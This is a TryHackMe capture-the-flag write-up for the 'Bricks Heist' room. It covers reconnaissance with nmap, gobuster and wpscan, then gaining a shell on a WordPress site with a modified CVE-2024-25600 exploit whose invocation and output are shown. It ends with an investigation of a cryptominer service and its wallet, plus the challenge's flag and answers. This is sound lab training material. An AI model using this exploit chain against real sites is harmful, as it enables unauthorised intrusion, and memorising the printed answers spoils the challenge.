
# Bricks Heist - TryHackMe Writeup

This is a writeup for the "Bricks Heist" challenge on TryHackMe, found [here](https://tryhackme.com/room/tryhack3mbricksheist). The scenario involves Brick Press Media Co. losing server access due to a compromise. My goal was to hack back in, recover a hidden file, and investigate a cryptomining operation. Below are my steps—mistakes included—along with tools, commands, and findings.

---

## Steps

### 1. Setup Hosts File
- Edited `/etc/hosts` to map `bricks.thm` to the target IP:
  ```bash
  cd /etc/
  nano hosts
  ```
- Added this line below existing entries:
  ```
  127.0.0.1   localhost
  127.0.0.1   vnc.tryhackme.tech
  127.0.1.1   tryhackme.lan   tryhackme
  10.10.14.5  bricks.thm
  ```

### 2. Initial Reconnaissance
- Scanned the target with `nmap`:
  ```bash
  nmap -A -sC -sV [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sC -sV 10.10.14.5
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, script scanning, traceroute).
  - `-sC`: Run default scripts for additional info.
  - `-sV`: Detect service versions.
- Results:
  ```
  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
  80/tcp   open  http     WebSockify Python/3.8.10
  443/tcp  open  ssl/http Apache httpd (WordPress 6.5)
  3306/tcp open  mysql    MySQL (unauthorized)
  ```
- Noted SSH, HTTP (WebSockify and WordPress), and MySQL.

### 3. Web Enumeration
- Tried `gobuster`:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [PATH TO WORDLIST]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.14.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Got an error: `405 (Length: 472)` status matched non-existent URLs, halting the scan.
- **Fix**: Added `-x 405 --exclude-length 472` to ignore 405 responses and their specific content length:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [PATH TO WORDLIST] -x 405 --exclude-length 472
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.14.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 405 --exclude-length 472
  ```
- Still found nothing useful.

- Moved to wpscan and scanned the WordPress site :
  ```bash
  wpscan --url https://bricks.thm
  ```
- Failed with: `SSL peer certificate or SSH remote key was not OK`.
- **Fix**: Added `--disable-tls-checks` to bypass SSL verification:
  ```bash
  wpscan --url https://bricks.thm --disable-tls-checks
  ```
- Flags explained:
  - `--url`: Target WordPress URL.
  - `--disable-tls-checks`: Ignore SSL certificate errors.
- Results:
  - WordPress version: 5.7
  - Theme: `bricks` (v1.9.5)
  - `robots.txt`: `/wp-admin/` disallowed.
  - No plugins or backups found.

### 4. Exploit WordPress Vulnerability
- Searched for "wordpress bricks 1.9.5 exploit" and found CVE-2024-25600, but the original exploit failed.
- Used my modified version from [GitHub](https://github.com/so1icitx/CVE-2024-25600):
  ```bash
  python3 exploit.py -u https://bricks.thm
  ```
- Flags explained:
  - `-u`: Target URL.
- Output:
  ```
  [*] Nonce found: 37bff0ff08
  [+] https://bricks.thm is vulnerable to CVE-2024-25600: apache
  [!] Shell ready! Type commands (exit to quit)
  ```
- Gained a shell.

### 5. Find the Hidden File
- Listed files in the web root:
  #### p.s started using '' because # is treated as a comment :p
  ```bash
  '# ls'
  ```
- Saw `650c844110baced87e1606453b93f22a.txt` among WordPress files.
- Read it:
  ```bash
  '# cat 650c844110baced87e1606453b93f22a.txt'
  ```
- Content: `THM{fl46_650c844110baced87e1606453b93f22a}`

### 6. Investigate Suspicious Process
- Checked running services:
  ```bash
  '# systemctl | grep running'
  ```
- Spotted `ubuntu.service` running `/lib/NetworkManager/nm-inet-dialog`, which seemed odd.
- Viewed its config:
  ```bash
  '# systemctl cat ubuntu.service'
  ```
- Output:
  ```
  [Unit]
  Description=TRYHACK3M
  [Service]
  Type=simple
  ExecStart=/lib/NetworkManager/nm-inet-dialog
  Restart=on-failure
  [Install]
  WantedBy=multi-user.target
  ```
- Suspicious process: `nm-inet-dialog`
- Service name: `ubuntu.service`

### 7. Locate Miner Log File
- Explored `/lib/NetworkManager/`:
  ```bash
  '# ls /lib/NetworkManager/'
  ```
- Found `inet.conf`.
- Checked the first 20 lines (file was large):
  ```bash
  '# head -n 20 /lib/NetworkManager/inet.conf'
  ```
- Saw mining logs with an encoded string.

### 8. Decode Miner Wallet Address
- Extracted the encoded string:
  ```
  5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
  ```
- Used CyberChef’s “Magic” function, which detected hex encoding and decoded it to two wallet addresses:
  - `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` (valid)
  - `bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` (invalid)
- Validated on [Blockchain.com Explorer](https://www.blockchain.com/explorer/).
- Wallet address: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### 9. Identify Threat Group
- Checked the wallet’s first transaction on Blockchain.com, linked to `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`.
- Googled the address and found references to the LockBit ransomware group.
- Threat group: `LockBit`

---

## Answers to Challenge Questions
1. **Content of the hidden .txt file**: `THM{fl46_650c844110baced87e1606453b93f22a}`
2. **Name of the suspicious process**: `nm-inet-dialog`
3. **Service name affiliated with the suspicious process**: `ubuntu.service`
4. **Log file name of the miner instance**: `inet.conf`
5. **Wallet address of the miner instance**: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
6. **Threat group involved**: `LockBit`

---

## Tools Used
- `nmap`: Network scanning.
- `gobuster`: Directory enumeration (with fix for 405 errors).
- `wpscan`: WordPress scanning (with TLS workaround).
- `python3 exploit.py`: Custom CVE-2024-25600 exploit.
- CyberChef: Decoding hex strings.
- [Blockchain.com Explorer](https://www.blockchain.com/explorer/): Wallet analysis.

---
